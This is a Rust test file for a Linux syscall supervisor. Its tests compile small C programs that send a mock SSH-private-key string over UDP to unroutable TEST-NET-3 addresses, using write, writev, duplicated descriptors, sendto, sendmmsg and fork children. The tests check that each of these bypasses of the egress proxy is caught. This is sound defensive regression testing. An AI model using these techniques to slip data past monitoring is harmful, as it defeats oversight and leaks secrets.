//! Go-live review B13 — datagram egress that bypassed the proxy.
//!
//! `socket(SOCK_DGRAM) → connect(attacker) → write(fd, secret)` reached an
//! arbitrary destination with no proxy evaluation and no audit record:
//! `write` is outside the seccomp trap set, and a connected-datagram
//! `connect` is deliberately unscored so `getaddrinfo`'s source-selection
//! probe does not prompt.
//!
//! These tests drive real supervised processes, so they need a tracer slot —
//! they skip when the test binary is itself being traced (e.g. run under
//! `grith exec`), because Linux permits only one tracer per process.

#[cfg(target_os = "linux")]
mod linux {
    use grith_supervisor::interceptor::{NetProtocol, SyscallKind};
    use std::fs;
    use std::path::{Path, PathBuf};
    use std::process::Command;
    use std::sync::{Mutex, OnceLock};
    use std::time::{Duration, Instant};

    fn test_lock() -> &'static Mutex<()> {
        static LOCK: OnceLock<Mutex<()>> = OnceLock::new();
        LOCK.get_or_init(|| Mutex::new(()))
    }

    fn already_traced() -> bool {
        fs::read_to_string("/proc/self/status")
            .ok()
            .and_then(|s| {
                s.lines()
                    .find_map(|l| l.strip_prefix("TracerPid:"))
                    .map(|v| v.trim() != "0")
            })
            .unwrap_or(false)
    }

    fn compile(dir: &Path, name: &str, source: &str) -> PathBuf {
        let src = dir.join(format!("{name}.c"));
        let bin = dir.join(name);
        fs::write(&src, source).expect("write helper source");
        let out = Command::new("cc")
            .args(["-O0", "-Wall", "-Wextra", "-o"])
            .arg(&bin)
            .arg(&src)
            .output()
            .expect("spawn cc");
        assert!(
            out.status.success(),
            "cc failed: {}",
            String::from_utf8_lossy(&out.stderr)
        );
        bin
    }

    /// Run `binary` under supervision, allowing everything, and collect every
    /// event it produced.
    async fn trace_allowing_all(binary: &Path, args: &[String]) -> Vec<SyscallKind> {
        let mut interceptor = grith_supervisor::platform::create_interceptor().unwrap();
        interceptor
            .spawn_supervised(binary.to_str().unwrap(), args, &[])
            .await
            .expect("spawn_supervised failed");

        let mut events = Vec::new();
        let start = Instant::now();
        loop {
            assert!(
                start.elapsed() < Duration::from_secs(20),
                "timeout waiting for helper to exit"
            );
            match interceptor.next_event().await.expect("next_event failed") {
                Some(event) => {
                    events.push(event.kind.clone());
                    interceptor.allow(event.tid).await.expect("allow failed");
                }
                None => break,
            }
        }
        events
    }

    fn udp_egress_to(dest: &str, port: u16, use_writev: bool, dup_fd: bool) -> String {
        let call = if use_writev {
            r#"struct iovec iov = { .iov_base = (void *)payload, .iov_len = sizeof(payload) - 1 };
    ssize_t n = writev(wfd, &iov, 1);"#
        } else {
            "ssize_t n = write(wfd, payload, sizeof(payload) - 1);"
        };
        let dup = if dup_fd {
            "int wfd = dup(fd); if (wfd < 0) return 3;"
        } else {
            "int wfd = fd;"
        };
        format!(
            r#"
#define _GNU_SOURCE
#include <arpa/inet.h>
#include <netinet/in.h>
#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/uio.h>
#include <unistd.h>

static const char payload[] = "BEGIN OPENSSH PRIVATE KEY";

int main(void) {{
    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd < 0) return 1;

    struct sockaddr_in a;
    memset(&a, 0, sizeof(a));
    a.sin_family = AF_INET;
    a.sin_port = htons({port});
    a.sin_addr.s_addr = inet_addr("{dest}");
    if (connect(fd, (struct sockaddr *)&a, sizeof(a)) < 0) return 2;

    {dup}
    {call}
    (void)n;
    close(fd);
    return 0;
}}
"#
        )
    }

    fn saw_udp_egress(events: &[SyscallKind], dest: &str, port: u16) -> bool {
        events.iter().any(|e| {
            matches!(
                e,
                SyscallKind::NetConnect { address, port: p, protocol: NetProtocol::Udp }
                    if address == dest && *p == port
            )
        })
    }

    /// The core B13 claim: a plain `write(2)` on a connected datagram socket
    /// is surfaced to the proxy as egress to the connected destination.
    #[test]
    fn connected_datagram_write_is_surfaced_as_egress() {
        if already_traced() {
            eprintln!("SKIP: process already traced");
            return;
        }
        let _guard = test_lock().lock().unwrap();
        let temp = tempfile::tempdir().unwrap();
        let bin = compile(
            temp.path(),
            "udp_write",
            &udp_egress_to("203.0.113.7", 4444, false, false),
        );

        let rt = tokio::runtime::Builder::new_current_thread()
            .enable_all()
            .build()
            .unwrap();
        let events = rt.block_on(trace_allowing_all(&bin, &[]));

        assert!(
            saw_udp_egress(&events, "203.0.113.7", 4444),
            "write() on a connected datagram socket must reach the proxy as \
             NetConnect(203.0.113.7:4444); saw {events:?}"
        );
    }

    /// `writev` is the obvious way around a write-only check.
    #[test]
    fn connected_datagram_writev_is_surfaced_as_egress() {
        if already_traced() {
            eprintln!("SKIP: process already traced");
            return;
        }
        let _guard = test_lock().lock().unwrap();
        let temp = tempfile::tempdir().unwrap();
        let bin = compile(
            temp.path(),
            "udp_writev",
            &udp_egress_to("203.0.113.8", 4445, true, false),
        );

        let rt = tokio::runtime::Builder::new_current_thread()
            .enable_all()
            .build()
            .unwrap();
        let events = rt.block_on(trace_allowing_all(&bin, &[]));

        assert!(
            saw_udp_egress(&events, "203.0.113.8", 4445),
            "writev() must be surfaced too; saw {events:?}"
        );
    }

    /// Duplicating the fd must not shed the tracking — the socket identity is
    /// shared across dups.
    #[test]
    fn write_through_a_duplicated_fd_is_surfaced() {
        if already_traced() {
            eprintln!("SKIP: process already traced");
            return;
        }
        let _guard = test_lock().lock().unwrap();
        let temp = tempfile::tempdir().unwrap();
        let bin = compile(
            temp.path(),
            "udp_write_dup",
            &udp_egress_to("203.0.113.9", 4446, false, true),
        );

        let rt = tokio::runtime::Builder::new_current_thread()
            .enable_all()
            .build()
            .unwrap();
        let events = rt.block_on(trace_allowing_all(&bin, &[]));

        assert!(
            saw_udp_egress(&events, "203.0.113.9", 4446),
            "a write through a dup'd fd must still be surfaced; saw {events:?}"
        );
    }

    /// False-positive guard: a loopback-connected datagram socket — the shape
    /// every DNS resolver uses — must not be stepped or scored.
    #[test]
    fn loopback_connected_datagram_write_is_not_scored() {
        if already_traced() {
            eprintln!("SKIP: process already traced");
            return;
        }
        let _guard = test_lock().lock().unwrap();
        let temp = tempfile::tempdir().unwrap();
        let bin = compile(
            temp.path(),
            "udp_write_loopback",
            &udp_egress_to("127.0.0.1", 9, false, false),
        );

        let rt = tokio::runtime::Builder::new_current_thread()
            .enable_all()
            .build()
            .unwrap();
        let events = rt.block_on(trace_allowing_all(&bin, &[]));

        assert!(
            !saw_udp_egress(&events, "127.0.0.1", 9),
            "loopback datagram traffic must not be scored as egress; saw {events:?}"
        );
    }

    /// The regression that made this hard: `getaddrinfo` performs an
    /// RFC-3484 source-selection probe (connect → getsockname → close, no
    /// data). It must produce no egress event, or every name lookup prompts
    /// (grith issue #51).
    #[test]
    fn getaddrinfo_source_selection_probe_produces_no_egress_event() {
        if already_traced() {
            eprintln!("SKIP: process already traced");
            return;
        }
        let _guard = test_lock().lock().unwrap();
        let temp = tempfile::tempdir().unwrap();
        // The probe shape, without the DNS lookup: connect a datagram socket
        // to a remote address, ask the kernel which source address it would
        // use, then close without sending anything.
        let bin = compile(
            temp.path(),
            "probe_only",
            r#"
#define _GNU_SOURCE
#include <arpa/inet.h>
#include <netinet/in.h>
#include <string.h>
#include <sys/socket.h>
#include <unistd.h>

int main(void) {
    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd < 0) return 1;
    struct sockaddr_in a;
    memset(&a, 0, sizeof(a));
    a.sin_family = AF_INET;
    a.sin_port = htons(443);
    a.sin_addr.s_addr = inet_addr("93.184.216.34");
    if (connect(fd, (struct sockaddr *)&a, sizeof(a)) < 0) return 2;
    struct sockaddr_in local;
    socklen_t len = sizeof(local);
    (void)getsockname(fd, (struct sockaddr *)&local, &len);
    close(fd);
    return 0;
}
"#,
        );

        let rt = tokio::runtime::Builder::new_current_thread()
            .enable_all()
            .build()
            .unwrap();
        let events = rt.block_on(trace_allowing_all(&bin, &[]));

        assert!(
            !saw_udp_egress(&events, "93.184.216.34", 443),
            "a connect that never sends must not be scored — this is the \
             non-interactive queue-freeze regression; saw {events:?}"
        );
    }

    /// The second hole closed by B13: an explicit destination on an
    /// *unconnected* socket, which needs no connect at all.
    #[test]
    fn unconnected_sendto_with_explicit_destination_is_surfaced() {
        if already_traced() {
            eprintln!("SKIP: process already traced");
            return;
        }
        let _guard = test_lock().lock().unwrap();
        let temp = tempfile::tempdir().unwrap();
        let bin = compile(
            temp.path(),
            "udp_sendto",
            r#"
#define _GNU_SOURCE
#include <arpa/inet.h>
#include <netinet/in.h>
#include <string.h>
#include <sys/socket.h>
#include <unistd.h>

static const char payload[] = "BEGIN OPENSSH PRIVATE KEY";

int main(void) {
    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd < 0) return 1;
    struct sockaddr_in a;
    memset(&a, 0, sizeof(a));
    a.sin_family = AF_INET;
    a.sin_port = htons(4447);
    a.sin_addr.s_addr = inet_addr("203.0.113.10");
    (void)sendto(fd, payload, sizeof(payload) - 1, 0,
                 (struct sockaddr *)&a, sizeof(a));
    close(fd);
    return 0;
}
"#,
        );

        let rt = tokio::runtime::Builder::new_current_thread()
            .enable_all()
            .build()
            .unwrap();
        let events = rt.block_on(trace_allowing_all(&bin, &[]));

        assert!(
            events.iter().any(|e| matches!(
                e,
                SyscallKind::NetSendTo { address, port }
                    if address == "203.0.113.10" && *port == 4447
            )),
            "sendto with an explicit remote destination must be surfaced; saw {events:?}"
        );
    }

    /// Run `binary`, DENYING every surfaced datagram egress (the NetConnect
    /// events) and allowing everything else. Returns the surfaced events.
    async fn trace_denying_egress(binary: &Path, args: &[String]) -> Vec<SyscallKind> {
        let mut interceptor = grith_supervisor::platform::create_interceptor().unwrap();
        interceptor
            .spawn_supervised(binary.to_str().unwrap(), args, &[])
            .await
            .expect("spawn_supervised failed");
        let mut surfaced = Vec::new();
        let start = Instant::now();
        loop {
            assert!(
                start.elapsed() < Duration::from_secs(20),
                "timeout waiting for helper to exit"
            );
            match interceptor.next_event().await.expect("next_event failed") {
                Some(event) => {
                    if matches!(
                        event.kind,
                        SyscallKind::NetConnect {
                            protocol: NetProtocol::Udp,
                            ..
                        }
                    ) {
                        surfaced.push(event.kind.clone());
                        interceptor.deny(event.tid).await.expect("deny failed");
                    } else {
                        interceptor.allow(event.tid).await.expect("allow failed");
                    }
                }
                None => break,
            }
        }
        surfaced
    }

    /// CRITICAL regression (go-live review round 2): the stepping entry/exit
    /// toggle desynchronised the first time another handler consumed an exit
    /// stop (one unrelated `socket()` between connect and write was enough),
    /// after which the write was judged at its EXIT stop — *after* the
    /// datagram was already on the wire. A DENY then returned EPERM while the
    /// bytes had shipped.
    ///
    /// The write is denied; if the decision is taken at ENTRY (correct) the
    /// syscall is cancelled and returns EPERM (-1). If the toggle desynced and
    /// the write ran before the deny, it returns the byte count (or a network
    /// errno), never EPERM.
    #[test]
    fn write_after_unrelated_syscall_is_denied_before_send() {
        if already_traced() {
            eprintln!(
                "SKIP write_after_unrelated_syscall_is_denied_before_send: process already traced"
            );
            return;
        }
        let _guard = test_lock().lock().unwrap();
        let temp = tempfile::tempdir().unwrap();
        let result_path = temp.path().join("write_ret");
        // 203.0.113.0/24 is TEST-NET-3: non-loopback (so it is stepped) and
        // unroutable, so a real send would fail with a network errno — only a
        // grith deny yields exactly EPERM.
        let source = String::from(
            r#"
#define _GNU_SOURCE
#include <arpa/inet.h>
#include <errno.h>
#include <netinet/in.h>
#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <unistd.h>

static const char payload[] = "BEGIN OPENSSH PRIVATE KEY";

int main(int argc, char **argv) {
    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    struct sockaddr_in a;
    memset(&a, 0, sizeof(a));
    a.sin_family = AF_INET;
    a.sin_port = htons(4444);
    a.sin_addr.s_addr = inet_addr("203.0.113.7");
    connect(fd, (struct sockaddr *)&a, sizeof(a));

    /* One unrelated socket() — the desync trigger. Its exit stop was
       consumed by the socket-lifecycle handler, inverting the toggle. */
    int junk = socket(AF_INET, SOCK_STREAM, 0);
    if (junk >= 0) close(junk);

    long ret = write(fd, payload, sizeof(payload) - 1);
    int e = (ret < 0) ? errno : 0;
    close(fd);
    if (argc > 1) {
        FILE *f = fopen(argv[1], "w");
        if (f) { (void)fprintf(f, "%ld %d\n", ret, e); (void)fclose(f); }
    }
    return 0;
}
"#,
        );
        let bin = compile(temp.path(), "toggle_desync", &source);
        let args = vec![result_path.to_str().unwrap().to_owned()];

        let rt = tokio::runtime::Builder::new_current_thread()
            .enable_all()
            .build()
            .unwrap();
        let surfaced = rt.block_on(trace_denying_egress(&bin, &args));

        assert!(
            !surfaced.is_empty(),
            "the write must still be surfaced after an unrelated socket() call"
        );
        let result = fs::read_to_string(&result_path).expect("result file missing");
        let mut parts = result.split_whitespace();
        let ret: i64 = parts.next().unwrap().parse().unwrap();
        let errno: i32 = parts.next().unwrap().parse().unwrap();
        assert!(
            ret < 0 && errno == libc::EPERM,
            "the denied write must be cancelled at entry (EPERM); got ret={ret} errno={errno} \
             — a non-EPERM result means the datagram shipped before the deny (toggle desync)"
        );
    }

    /// HIGH regression (go-live review round 2): on a *connected* UDP socket,
    /// an explicit destination on the send wins (Linux delivers there), but
    /// the connected-peer arm scored the recorded peer — naming the wrong
    /// host and letting the real egress through. The surfaced event must name
    /// the EXPLICIT destination.
    #[test]
    fn connected_socket_explicit_destination_wins() {
        if already_traced() {
            eprintln!("SKIP connected_socket_explicit_destination_wins: process already traced");
            return;
        }
        let _guard = test_lock().lock().unwrap();
        let temp = tempfile::tempdir().unwrap();
        let bin = compile(
            temp.path(),
            "udp_connected_override",
            r#"
#define _GNU_SOURCE
#include <arpa/inet.h>
#include <netinet/in.h>
#include <string.h>
#include <sys/socket.h>
#include <unistd.h>

static const char payload[] = "BEGIN OPENSSH PRIVATE KEY";

int main(void) {
    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    struct sockaddr_in peer;
    memset(&peer, 0, sizeof(peer));
    peer.sin_family = AF_INET;
    peer.sin_port = htons(9);
    peer.sin_addr.s_addr = inet_addr("127.0.0.1");   /* connect to loopback */
    connect(fd, (struct sockaddr *)&peer, sizeof(peer));

    struct sockaddr_in dst;
    memset(&dst, 0, sizeof(dst));
    dst.sin_family = AF_INET;
    dst.sin_port = htons(4802);
    dst.sin_addr.s_addr = inet_addr("203.0.113.8");  /* explicit remote */
    (void)sendto(fd, payload, sizeof(payload) - 1, 0,
                 (struct sockaddr *)&dst, sizeof(dst));
    close(fd);
    return 0;
}
"#,
        );
        let rt = tokio::runtime::Builder::new_current_thread()
            .enable_all()
            .build()
            .unwrap();
        let events = rt.block_on(trace_allowing_all(&bin, &[]));

        assert!(
            saw_udp_egress(&events, "203.0.113.8", 4802),
            "the explicit destination must be surfaced, not the loopback peer; saw {events:?}"
        );
        assert!(
            !saw_udp_egress(&events, "127.0.0.1", 9),
            "the connected loopback peer must NOT be the scored address; saw {events:?}"
        );
    }

    /// HIGH regression (go-live review round 2): sendmmsg with an explicit
    /// msg_name on an unconnected socket was not classified — exfiltration
    /// with no connect and no write.
    #[test]
    fn sendmmsg_explicit_destination_is_surfaced() {
        if already_traced() {
            eprintln!("SKIP sendmmsg_explicit_destination_is_surfaced: process already traced");
            return;
        }
        let _guard = test_lock().lock().unwrap();
        let temp = tempfile::tempdir().unwrap();
        let bin = compile(
            temp.path(),
            "udp_sendmmsg",
            r#"
#define _GNU_SOURCE
#include <arpa/inet.h>
#include <netinet/in.h>
#include <string.h>
#include <sys/socket.h>
#include <unistd.h>

static const char payload[] = "BEGIN OPENSSH PRIVATE KEY";

int main(void) {
    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    struct sockaddr_in a;
    memset(&a, 0, sizeof(a));
    a.sin_family = AF_INET;
    a.sin_port = htons(4803);
    a.sin_addr.s_addr = inet_addr("203.0.113.11");

    struct iovec iov = { .iov_base = (void *)payload, .iov_len = sizeof(payload) - 1 };
    struct mmsghdr m;
    memset(&m, 0, sizeof(m));
    m.msg_hdr.msg_name = &a;
    m.msg_hdr.msg_namelen = sizeof(a);
    m.msg_hdr.msg_iov = &iov;
    m.msg_hdr.msg_iovlen = 1;
    (void)sendmmsg(fd, &m, 1, 0);
    close(fd);
    return 0;
}
"#,
        );
        let rt = tokio::runtime::Builder::new_current_thread()
            .enable_all()
            .build()
            .unwrap();
        let events = rt.block_on(trace_allowing_all(&bin, &[]));

        assert!(
            events.iter().any(|e| matches!(
                e,
                SyscallKind::NetSendTo { address, port }
                    if address == "203.0.113.11" && *port == 4803
            )),
            "sendmmsg with an explicit destination must be surfaced; saw {events:?}"
        );
    }

    /// CRITICAL regression (go-live review round 2): a fork child inherits the
    /// connected datagram socket but gets a new TGID, and stepping was keyed
    /// by TGID, so the child's write egressed with no event. The child's
    /// write must be surfaced.
    #[test]
    fn fork_child_write_is_surfaced() {
        if already_traced() {
            eprintln!("SKIP fork_child_write_is_surfaced: process already traced");
            return;
        }
        let _guard = test_lock().lock().unwrap();
        let temp = tempfile::tempdir().unwrap();
        let bin = compile(
            temp.path(),
            "udp_fork_child",
            r#"
#define _GNU_SOURCE
#include <arpa/inet.h>
#include <netinet/in.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <unistd.h>

static const char payload[] = "BEGIN OPENSSH PRIVATE KEY";

int main(void) {
    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    struct sockaddr_in a;
    memset(&a, 0, sizeof(a));
    a.sin_family = AF_INET;
    a.sin_port = htons(4711);
    a.sin_addr.s_addr = inet_addr("203.0.113.9");
    connect(fd, (struct sockaddr *)&a, sizeof(a));

    pid_t c = fork();
    if (c == 0) {
        /* Child: inherited the connected socket, new TGID. */
        (void)write(fd, payload, sizeof(payload) - 1);
        _exit(0);
    }
    int st;
    waitpid(c, &st, 0);
    close(fd);
    return 0;
}
"#,
        );

        let rt = tokio::runtime::Builder::new_current_thread()
            .enable_all()
            .build()
            .unwrap();
        let events = rt.block_on(trace_allowing_all(&bin, &[]));

        assert!(
            saw_udp_egress(&events, "203.0.113.9", 4711),
            "the fork child's write on the inherited socket must be surfaced; saw {events:?}"
        );
    }
}
